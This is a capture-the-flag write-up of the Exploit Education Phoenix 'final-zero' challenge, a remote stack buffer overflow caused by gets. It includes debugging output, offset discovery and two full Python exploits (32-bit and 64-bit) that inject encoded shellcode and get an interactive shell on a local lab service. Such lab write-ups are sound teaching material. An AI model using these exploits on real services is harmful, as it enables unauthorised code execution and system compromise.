# Final 0 

Write-up for: [https://exploit.education/phoenix/final-zero/](https://exploit.education/phoenix/final-zero/).

<!--more-->

Now we're getting into the three final exercises of Phoenix. The first is a remote stack buffer overflow.

## The vulnerability

```C
char *get_username() {
  char buffer[512];
  char *q;
  int i;

  memset(buffer, 0, sizeof(buffer));
  gets(buffer);
```

The vulnerability is in the `get_username` function. A local char array is filled with `gets` reading from standard input until a newline character is encountered. It does not perform range-checking and thus introduces a stack-based buffer overflow vulnerability.

## Developing the exploit

Exploiting this vulnerability should be fairly straightforward. Since the vulnerability is in a function and there are no mitigations, the following should be a suitable plan of attack:

- Write more than 512 bytes to `buffer` in order to overwrite the stored `RIP`
- Write shellcode to the `buffer variable`, there should be more than enough space.

While developing our exploit, we need to consider the following constraints:

```C
q = strchr(buffer, '\n');
if (q) *q = 0;
q = strchr(buffer, '\r');
if (q) *q = 0;
```

This piece of code and the fact that the program uses `gets` means that we cannot use newline characters as part of our payload. `\n` is `0xa`, `\r` is `0xd`. Null bytes are also not allowed as this would terminate the string.

```C
for (i = 0; i < strlen(buffer); i++) {
  buffer[i] = toupper(buffer[i]);
}
```

All characters in the buffer are converted to upper case. This means that if we have a byte value between `0x61` and `0x7a`, `0x20` will be subtraced because this is how far lower- and upper-case letters are apart in ascii.

To summarize, our forbidden characters are:

- 0x0
- 0xa, 0xd
- 0x61 - 0x7a

Keeping this in mind we can start by triggering the vulnerability and confirming that we can control `RIP`. Since this is a remote exploit, we use Python (or netcat in the beginning) to connect to the service and to deliver our payload. On the server, we can attach to the process with GDB to see what's going on. The service is running on port 64003.

Since the remote challenges are run and controlled by `systemd` together with `getty`, it can be a bit tricky to find the right process to debug. Once you connect to the service a new process is forked by `systemd` and you can find the process id like this (as root): 

```
root@phoenix-amd64:~# netstat -antp | grep 64003
tcp        0      0 127.0.0.1:64003         0.0.0.0:*               LISTEN      1/init

```

But when we attach and try to break on or disassemble the `get_username` function, it fails. The reason seems to be that the function is at a very low memory address that we can't access.

```
(gdb) disas get_username
Dump of assembler code for function get_username:
   0x00000000004007cd <+0>:     Cannot access memory at address 0x4007cd
```

We'll revisit that later if necessary. Let's first try crashing it! We should be able to use gdb to examine the crash. This time we attach to the `init` process and instruct gdb to follow child forks. This way, we can run our exploit as a whole without having to first establish a connection, then attaching to the spawned process and only then sending our payload. This is especially useful for "fire-and-forget" payloads sent with `netcat`. Later, in Python, we could also first create as socket and wait for some user input while we attach to the newly spawned process in the other terminal.

```

Bingo! We control `$rbx`, `$rbp` and most importantly `$rip` ("AAAAAAAA"). Now it's just a matter of finding the right offsets and constructing a suitable payload.

The main challenge in creating the payload is the list of forbidden characters. I spend an embarrassingly long time on trying to create a payload without any lowercase characters. You can for example use `msfvenom` or the encoders in the `pwnlib` library (see [here](http://docs.pwntools.com/en/stable/encoders.html)). But nothing I tried worked for the large number of excluded bytes. Then it hit me:

```C
/* Strip off trailing new line characters */
q = strchr(buffer, '\n');
if (q) *q = 0;
q = strchr(buffer, '\r');
if (q) *q = 0;

/* Convert to lower case */
for (i = 0; i < strlen(buffer); i++) {
```

The "convert to lower case" loop runs for `strlen(buffer)` iterations. `strlen` counts the number of bytes in `buffer` until the first `\0` byte it encounters. Before the loop, newline characters are converted to NULL BYTES! So that means that we don't need to worry about removing lowercase characters from our payload as long as we start with a newline! There's one catch, `gets` ends reading input if it encouters `\n`, but we can just send a single `\r` byte instead. Let's confirm this theory. We'll send a payload with lowercase `a` characters. If it segfaults and `$rip` is `aaaaaaaa` we win:

```
user@phoenix-amd64:~$ python -c 'print("hello\r" + "a"*600)' | nc 127.0.0.1 64003

# gdb
Program terminated with signal SIGSEGV, Segmentation fault.
$rip   : 0x6161616161616161 ("aaaaaaaa"?)
```

Nice, let's create an exploit!

First, we need to find the offset to overwriting `$rip`. For this we'll use the excellent [exploit-pattern script](https://github.com/Svenito/exploit-pattern/blob/master/pattern.py):

```
user@phoenix-amd64:~$ wget https://raw.githubusercontent.com/Svenito/exploit-pattern/master/pattern.py
user@phoenix-amd64:~$ python pattern.py 600 | nc 127.0.0.1 64003
Welcome to phoenix/final-zero, brought to you by https://exploit.education
^C

# in gdb as root
$rip   : 0x7341357341347341 ("As4As5As"?)

user@phoenix-amd64:~$ python pattern.py As4As5As
Pattern As4As5As first occurrence at position 552 in pattern.
```

Easy, the address of our shellcode needs to be at offset `552`. As an address (no ASLR), we can use an address shortly after the beginning of the buffer (after the `\n` byte we place there). Since the buffer is quite large we can leave some room (rember, offsets are slightly different in GDB due to the different environment).  Now we can create a payload with `pwnlib` or `msfvenom` and we're done...

Or so I thought. At this point I got completely stuck. I tried generating different shellcode with the various tools and ended up trying out pretty much every shellcode I came across both for the 32-bit and 64-bit variant. No luck. I double checked and was sure that the shellcode was reached and executed and no bytes were harmed in the process. But either it segfaulted during the shellcode execution or it reached some syscall and just *stopped doing anything*. In the end I even reached out to various channels where I searched for help (thanks, u/joenibe :) ).

Then I reduced my goals to just executing a single command on the target (e.g. `id`). And in gdb I could see that a new process was spawned, but when I never saw any output from my exploit, it dawned on me. I sent the exploit to the server and then, in my script, just closed the socket right away. Obviously not the greatest idea if you want to read from a newly spawned process. I quickly changed my exploit and came up with the following (first 32-bit, then 64-bit), giving me a basic shell.

### 32-bit exploit (port 64013)
```Python
import struct
import socket
import pwnlib

HOST = "127.0.0.1"
PORT = 64013
# buffer offset is 0xffffdb18
SHELLCODE_ADDR = 0xffffdb20 

def read_line_from_sock(socket):
    buf = ""
    while True:
        b = s.recv(1)
        if b == b'\n':
            break
        buf += b.decode("ascii")
    return buf

# EXPLOIT CODE starts here
payload = "\r" + b'\x90' * 16 
payload += pwnlib.encoders.encoder.encode(pwnlib.asm.asm(pwnlib.shellcraft.i386.linux.sh()), "\n\r\0")
payload += b'\x90'*(532 - len(payload)) 
payload += struct.pack("<I", SHELLCODE_ADDR) + "\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

print(read_line_from_sock(s))
print("+ sending payload")
s.sendall(payload)
print("+ we have a shell now!")

while True:
    s.sendall(raw_input() + "\n")
    print(s.recv(1024))
```

### 64-bit exploit (port 64003)
```Python
import struct
import socket
import pwnlib

HOST = "127.0.0.1"
PORT = 64003

# buffer offset is 0x7fffffffea60
SHELLCODE_ADDR = 0x7fffffffea6a

def read_line_from_sock(socket):
    buf = ""
    while True:
        b = s.recv(1)
        if b == b'\n':
            break
        buf += b.decode("ascii")
    return buf

# EXPLOIT CODE starts here
payload = "\r" + b'\x90' * 16 
payload += pwnlib.encoders.encoder.encode(pwnlib.asm.asm(pwnlib.shellcraft.amd64.linux.sh(), arch='amd64'), "\n\r\0")
payload += b'\x90'*(552 - len(payload)) 
payload += struct.pack("<Q", SHELLCODE_ADDR) + "\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

print(read_line_from_sock(s))
print("+ sending payload")
s.sendall(payload)
print("+ we have a shell now!")

while True:
    s.sendall(raw_input() + "\n")
    print(s.recv(1024))
```

We did it! It's still not entirely clear to me why no bind / reverse shell payload would work for me. My guess is that is has to do with the way the final challenges are run via `systemd`. I read somewhere that there is some sort of syscall filtering in place, maybe I was hit by that. I'm not sure though, so if someone is luckier (and/or smarter) than me, let me now!

## Afterword

This challenge was by no means very difficult (stack 6 was way trickier to exploit, for example). It was a straightforward stack buffer overflow with the small challenge of working around the `topupper` hurdle. There is no ASLR and the stack is executable. The fact that it still took me many frustating hours is a lesson learned for me: every detail matters in exploit development and persistence is key. Re-reading my exploit code would have been a lot smarter than just firing one payload after another at the target. If you're stuck, take a step back, don't just keep firing blindly.

Another important lesson is that there is usually more than one way to solve these challenges. For example, instead of finding the `\r` trick in order to place your shellcode inside the buffer, you could use a different technique such as `ret2libc`, as a very helpful Reddit member pointed out to me (thanks again, u/joenibe). Always keep an open mind.
